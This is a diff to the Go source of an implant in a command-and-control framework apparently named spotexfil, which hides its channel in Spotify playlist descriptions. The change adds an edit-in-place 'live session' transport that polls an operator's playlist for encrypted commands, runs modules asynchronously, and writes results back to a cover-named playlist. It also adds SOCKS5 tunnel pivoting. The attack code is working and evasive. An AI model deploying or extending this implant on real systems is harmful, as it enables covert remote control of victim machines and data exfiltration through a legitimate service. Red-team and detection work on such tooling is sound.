@@ -22,6 +22,7 @@ import (
 
 	"github.com/sourcefrenchy/spotexfil/internal/crypto"
 	"github.com/sourcefrenchy/spotexfil/internal/protocol"
+	"github.com/sourcefrenchy/spotexfil/internal/shared"
 	"github.com/sourcefrenchy/spotexfil/internal/spotify"
 )
 
@@ -57,6 +58,69 @@ type Implant struct {
 	ephPub     *ecdh.PublicKey
 	skMu       sync.RWMutex
 	sessionKey []byte // derived ECDH session key (nil until key exchange)
+
+	// Live session transport (edit-in-place). When live is true, the
+	// implant owns a long-lived RES session playlist it updates to send
+	// results, and reads the operator's CMD session playlist directly
+	// by ID instead of listing. cmdSessionID/cmdTracker/liveReadFails/
+	// lastClassicPoll are only touched by the poll goroutine;
+	// resSessionID is also read by the result writer goroutine (liveMu).
+	live            bool
+	resSessionID    string // our live RES session playlist (we update it)
+	cmdSessionID    string // operator's live CMD session playlist (we read it)
+	cmdTracker      seqTracker
+	liveReadFails   int // consecutive direct-GET failures on cmd session
+	lastClassicPoll time.Time
+	liveMu          sync.Mutex // guards resSessionID
+}
+
+// Live-session timing. In live mode both sides still do an occasional
+// classic listing pass: the implant to sweep classic cmd playlists and
+// (re)discover the operator's session, the operator to pick up classic
+// heartbeat checkins and (re)discover the implant's session.
+const (
+	liveClassicSweepInterval = 120 * time.Second // implant classic sweep
+	liveListingInterval      = 60 * time.Second  // operator classic listing
+)
+
+// seqTracker dedupes incoming live-session messages by sequence number.
+// With edit-in-place transport there is a single mailbox slot, so the
+// receiver only ever sees the latest seq; anything older or equal is a
+// replay of an already-handled message.
+type seqTracker struct {
+	lastSeen int
+	started  bool
+}
+
+// accept reports whether seq should be handled and, if so, records it.
+// Negative seqs are control messages (e.g. shutdown) and are never
+// deduped.
+func (t *seqTracker) accept(seq int) bool {
+	if seq < 0 {
+		return true
+	}
+	if !t.started || seq > t.lastSeen {
+		t.started = true
+		t.lastSeen = seq
+		return true
+	}
+	return false
+}
+
+// findLiveSession scans tag-filtered read results for a live-session
+// playlist and returns its playlist ID and seq. When several are
+// present, the one with the highest seq wins.
+func findLiveSession(seqGroups map[int][]protocol.ChunkMeta) (playlistID string, seq int, ok bool) {
+	best := -1
+	for s, metas := range seqGroups {
+		for _, cm := range metas {
+			if protocol.IsLiveMeta(cm.Meta) && cm.PlaylistID != "" && s > best {
+				best = s
+				playlistID = cm.PlaylistID
+			}
+		}
+	}
+	return playlistID, best, playlistID != ""
 }
 
 // ImplantOptions controls implant behavior.
@@ -64,6 +128,7 @@ type ImplantOptions struct {
 	Interval       int
 	Jitter         int
 	Quiet          bool
+	Live           bool     // use live-session (edit-in-place) transport
 	AllowedModules []string // nil or empty = all modules enabled
 }
 
@@ -126,6 +191,7 @@ func NewImplantWithOptions(client *spotify.Client, key string, opts ImplantOptio
 		interval:        interval,
 		jitter:          jitter,
 		quiet:           opts.Quiet,
+		live:            opts.Live,
 		allowedModules:  allowedModules,
 		processedSeqs:   make(map[int]bool),
 		sessionID:       sessionID,
@@ -386,6 +452,13 @@ func (imp *Implant) Run() {
 
 	imp.sendCheckin()
 
+	// Live mode: create our long-lived RES session playlist after the
+	// initial (classic) checkin so the operator can discover it via the
+	// tag-filtered listing.
+	if imp.live {
+		imp.ensureResSession(context.Background())
+	}
+
 	// Start async result writer
 	go imp.resultWriter()
 
@@ -442,7 +515,53 @@ func (imp *Implant) Run() {
 
 func (imp *Implant) pollAndExecute() {
 	ctx := context.Background()
+	if imp.live {
+		imp.pollAndExecuteLive(ctx)
+		return
+	}
+	imp.pollAndExecuteClassic(ctx, false)
+}
 
+// pollAndExecuteLive polls the operator's CMD session playlist directly
+// by ID (1 API call per poll). Falls back to a live-aware classic
+// listing pass for discovery, periodic sweeps, and repeated failures.
+func (imp *Implant) pollAndExecuteLive(ctx context.Context) {
+	if imp.cmdSessionID != "" &&
+		time.Since(imp.lastClassicPoll) < liveClassicSweepInterval {
+		desc, err := imp.client.GetPlaylistDescription(ctx, imp.cmdSessionID)
+		if err == nil {
+			imp.liveReadFails = 0
+			seq, data, perr := protocol.ParseLiveSessionDesc(desc, imp.key)
+			if perr == nil && imp.cmdTracker.accept(seq) {
+				imp.handleCommandPayload(seq, data)
+			}
+			return
+		}
+		// Direct GET failed: the peer may have rotated/recreated the
+		// session playlist. Drop the cached ID to force re-discovery.
+		imp.liveReadFails++
+		imp.cmdSessionID = ""
+		if imp.liveReadFails < 3 {
+			return // re-discover on the next cycle
+		}
+		imp.liveReadFails = 0
+		imp.logf("[!] Live session read failing, " +
+			"falling back to classic polling this cycle\n")
+	} else if imp.cmdSessionID == "" &&
+		time.Since(imp.lastClassicPoll) < liveClassicSweepInterval {
+		return // nothing discovered yet; wait for the next sweep
+	}
+
+	// Discovery / periodic classic sweep (live-aware: adopts the live
+	// session playlist instead of deleting it).
+	imp.lastClassicPoll = time.Now()
+	imp.pollAndExecuteClassic(ctx, true)
+}
+
+// pollAndExecuteClassic is the original create/delete polling pass.
+// When liveAware is true (live mode's discovery/sweep), live-session
+// playlists are adopted for direct reads and never deleted.
+func (imp *Implant) pollAndExecuteClassic(ctx context.Context, liveAware bool) {
 	seqGroups, err := imp.client.ReadC2Playlists(ctx,
 		protocol.ChannelCmd, imp.key, -1)
 	if err != nil {
@@ -476,99 +595,119 @@ func (imp *Implant) pollAndExecute() {
 		return
 	}
 
+	if liveAware {
+		if id, _, ok := findLiveSession(seqGroups); ok {
+			imp.cmdSessionID = id
+			imp.logf("[*] Live CMD session discovered (%s)\n", id)
+		}
+	}
+
 	for seqNum, chunkMetas := range seqGroups {
+		// Live session playlist: handle its current content through
+		// seq dedupe, but never delete it (the sender owns it).
+		if liveAware && len(chunkMetas) > 0 &&
+			protocol.IsLiveMeta(chunkMetas[0].Meta) {
+			if imp.cmdTracker.accept(seqNum) {
+				imp.handleCommandPayload(seqNum,
+					protocol.ReassemblePayload(chunkMetas))
+			}
+			continue
+		}
+
 		imp.seqMu.Lock()
 		alreadyProcessed := imp.processedSeqs[seqNum]
 		imp.seqMu.Unlock()
 
-		if alreadyProcessed {
-			_ = imp.client.CleanC2Playlists(ctx,
-				protocol.ChannelCmd, imp.key, seqNum)
-			continue
+		if !alreadyProcessed {
+			imp.handleCommandPayload(seqNum,
+				protocol.ReassemblePayload(chunkMetas))
 		}
-
-		payload := protocol.ReassemblePayload(chunkMetas)
-
-		// Try decryption: session key first, then master key
-		var cmdDict map[string]interface{}
-		var decErr error
-		if sk := imp.getSessionKey(); sk != nil {
-			cmdDict, decErr = protocol.DecodeMessageRaw(payload, sk)
-		}
-		if cmdDict == nil {
-			cmdDict, decErr = protocol.DecodeMessage(payload, imp.key)
-		}
-		if cmdDict == nil {
-			// Both failed — silently discard (stale from prior session)
-			_ = imp.client.CleanC2Playlists(ctx,
-				protocol.ChannelCmd, imp.key, seqNum)
-			_ = decErr // suppress unused
-			continue
-		}
-
-		msg := protocol.FromCommandMap(cmdDict)
-
-		// Validate timestamp -- reject stale commands (replay protection)
-		age := math.Abs(float64(time.Now().Unix()) - msg.Ts)
-		if age > 300 {
-			fmt.Printf("[!] Stale command rejected (seq=%d, age=%.0fs)\n", seqNum, age)
-			_ = imp.client.CleanC2Playlists(ctx,
-				protocol.ChannelCmd, imp.key, seqNum)
-			continue
-		}
-
-		// Validate session ID -- reject commands from stale sessions
-		if msg.SessionID != "" && msg.SessionID != imp.sessionID {
-			_ = imp.client.CleanC2Playlists(ctx,
-				protocol.ChannelCmd, imp.key, seqNum)
-			continue
-		}
-
-		// Handle operator shutdown signal
-		if msg.Module == "shutdown" {
-			_ = imp.client.CleanC2Playlists(ctx,
-				protocol.ChannelCmd, imp.key, seqNum)
-			fmt.Printf("\n\033[33m[!] Operator disconnected at %s\033[0m\n",
-				time.Now().Format("15:04:05"))
-			fmt.Println("\033[33m[!] Waiting for operator to reconnect...\033[0m")
-			// Reset forward secrecy (new operator will have different X25519 keys)
-			imp.setSessionKey(nil)
-			// Force immediate re-checkin so new operator sees us
-			imp.checkinPending = true
-			imp.lastCheckin = time.Time{}
-			imp.seqMu.Lock()
-			imp.processedSeqs = make(map[int]bool)
-			imp.seqMu.Unlock()
-			continue
-		}
-
-		// Handle key exchange for forward secrecy
-		if msg.Module == "keyexchange" {
-			_ = imp.client.CleanC2Playlists(ctx,
-				protocol.ChannelCmd, imp.key, seqNum)
-			imp.handleKeyExchange(msg)
-			imp.seqMu.Lock()
-			imp.processedSeqs[seqNum] = true
-			imp.seqMu.Unlock()
-			continue
-		}
-
-		imp.logf("\033[36m[>] Exec\033[0m seq=%d %s\n", seqNum, msg.Module)
-
-		// Async execution: dispatch to goroutine, send result via channel
-		imp.wg.Add(1)
-		go func(m *protocol.C2Message) {
-			defer imp.wg.Done()
-			result := imp.execute(m)
-			imp.resultCh <- result
-		}(msg)
 
 		_ = imp.client.CleanC2Playlists(ctx,
 			protocol.ChannelCmd, imp.key, seqNum)
+	}
+}
+
+// handleCommandPayload decodes, validates and dispatches one command
+// payload: timestamp validation, session binding, shutdown and
+// keyexchange handling, and async module execution. It performs no
+// playlist cleanup — that is the caller's responsibility (classic mode
+// deletes; live mode must not).
+func (imp *Implant) handleCommandPayload(seqNum int, payload string) {
+	// Try decryption: session key first, then master key
+	var cmdDict map[string]interface{}
+	if sk := imp.getSessionKey(); sk != nil {
+		cmdDict, _ = protocol.DecodeMessageRaw(payload, sk)
+	}
+	if cmdDict == nil {
+		cmdDict, _ = protocol.DecodeMessage(payload, imp.key)
+	}
+	if cmdDict == nil {
+		// Both failed — silently discard (stale from prior session)
+		return
+	}
+
+	msg := protocol.FromCommandMap(cmdDict)
+
+	// Validate timestamp -- reject stale commands (replay protection)
+	age := math.Abs(float64(time.Now().Unix()) - msg.Ts)
+	if age > 300 {
+		fmt.Printf("[!] Stale command rejected (seq=%d, age=%.0fs)\n", seqNum, age)
+		return
+	}
+
+	// Validate session ID -- reject commands from stale sessions
+	if msg.SessionID != "" && msg.SessionID != imp.sessionID {
+		return
+	}
+
+	// Handle operator shutdown signal
+	if msg.Module == "shutdown" {
+		fmt.Printf("\n\033[33m[!] Operator disconnected at %s\033[0m\n",
+			time.Now().Format("15:04:05"))
+		fmt.Println("\033[33m[!] Waiting for operator to reconnect...\033[0m")
+		// Reset forward secrecy (new operator will have different X25519 keys)
+		imp.setSessionKey(nil)
+		// Force immediate re-checkin so new operator sees us
+		imp.checkinPending = true
+		imp.lastCheckin = time.Time{}
+		imp.seqMu.Lock()
+		imp.processedSeqs = make(map[int]bool)
+		imp.seqMu.Unlock()
+		return
+	}
+
+	// Handle key exchange for forward secrecy
+	if msg.Module == "keyexchange" {
+		imp.handleKeyExchange(msg)
 		imp.seqMu.Lock()
 		imp.processedSeqs[seqNum] = true
 		imp.seqMu.Unlock()
+		return
 	}
+
+	// Handle tunnel frames (SOCKS5 pivoting)
+	if msg.Module == "tunnel" {
+		imp.handleTunnelFrame(msg)
+		imp.seqMu.Lock()
+		imp.processedSeqs[seqNum] = true
+		imp.seqMu.Unlock()
+		return
+	}
+
+	imp.logf("\033[36m[>] Exec\033[0m seq=%d %s\n", seqNum, msg.Module)
+
+	// Async execution: dispatch to goroutine, send result via channel
+	imp.wg.Add(1)
+	go func(m *protocol.C2Message) {
+		defer imp.wg.Done()
+		result := imp.execute(m)
+		imp.resultCh <- result
+	}(msg)
+
+	imp.seqMu.Lock()
+	imp.processedSeqs[seqNum] = true
+	imp.seqMu.Unlock()
 }
 
 // handleKeyExchange processes a keyexchange command from the operator.
@@ -667,6 +806,30 @@ func (imp *Implant) sendResult(ctx context.Context, result *protocol.C2Message) 
 		return
 	}
 
+	// Live mode: update our RES session playlist in place (1 API call)
+	// when the payload fits in a single description.
+	if imp.live && len(encoded) <= shared.Proto.C2.EffectiveChunk {
+		if imp.ensureResSession(ctx) {
+			imp.liveMu.Lock()
+			id := imp.resSessionID
+			imp.liveMu.Unlock()
+			desc, derr := protocol.LiveSessionDesc(
+				protocol.ChannelRes, result.Seq, encoded, imp.key)
+			if derr == nil {
+				if uerr := imp.client.UpdatePlaylistDescription(ctx, id, desc); uerr == nil {
+					imp.logf("\033[90m[<] Result sent seq=%d (live)\033[0m\n",
+						result.Seq)
+					return
+				}
+			}
+			// Update failed — the session playlist may be gone. Drop
+			// it (recreated on next send) and fall back to classic.
+			imp.liveMu.Lock()
+			imp.resSessionID = ""
+			imp.liveMu.Unlock()
+		}
+	}
+
 	chunks, err := protocol.ChunkPayload(encoded, result.Seq,
 		protocol.ChannelRes, imp.key)
 	if err != nil {
@@ -680,4 +843,33 @@ func (imp *Implant) sendResult(ctx context.Context, result *protocol.C2Message) 
 	}
 
 	imp.logf("\033[90m[<] Result sent seq=%d\033[0m\n", result.Seq)
+}
+
+// ensureResSession creates the implant's long-lived RES session
+// playlist if it doesn't exist yet. The initial description is a
+// live-session beacon (seq 0, empty data) so the operator can discover
+// it via the tag-filtered listing. Returns true if the session exists.
+func (imp *Implant) ensureResSession(ctx context.Context) bool {
+	imp.liveMu.Lock()
+	have := imp.resSessionID != ""
+	imp.liveMu.Unlock()
+	if have {
+		return true
+	}
+
+	desc, err := protocol.LiveSessionDesc(protocol.ChannelRes, 0, "", imp.key)
+	if err != nil {
+		return false
+	}
+	id, err := imp.client.CreateSessionPlaylist(ctx,
+		spotify.GenerateCoverName(), desc)
+	if err != nil {
+		fmt.Printf("[!] Live session playlist create failed: %v\n", err)
+		return false
+	}
+	imp.liveMu.Lock()
+	imp.resSessionID = id
+	imp.liveMu.Unlock()
+	imp.logf("[*] Live RES session playlist created\n")
+	return true
 }
